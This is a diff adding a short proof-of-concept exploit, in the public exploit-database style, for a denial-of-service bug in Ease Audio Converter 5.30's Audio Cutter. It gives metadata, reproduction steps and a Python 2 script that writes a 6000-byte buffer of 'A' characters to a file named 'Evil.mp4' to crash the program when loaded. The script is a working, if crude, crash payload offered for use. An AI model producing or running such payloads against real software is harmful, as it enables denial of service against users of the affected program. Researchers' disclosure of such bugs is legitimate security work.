@@ -1,0 +1,28 @@
+# Exploit Title: Ease Audio Converter 5.30 Audio Cutter Dos Exploit
+# Date: 19.04.19
+# Vendor Homepage:http://www.audiotool.net/download.htm
+# Software Link:  http://www.audiotool.net/download/audioconverter.exe
+# Exploit Author: Achilles
+# Tested Version: 5.30
+# Tested on: Windows 7 x64 Sp1
+
+# 1.- Run the python script, it will create a new file with the name "Evil.mp4"
+# 2.- Open AudioConverter.exe and Click Function and choose Audio Cutter
+# 3.- Load the file "Evil.mp4"
+# 4.- Click ok
+# 5.- Click Gut
+# 5.- And you will see a crash.
+
+
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.mp4","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
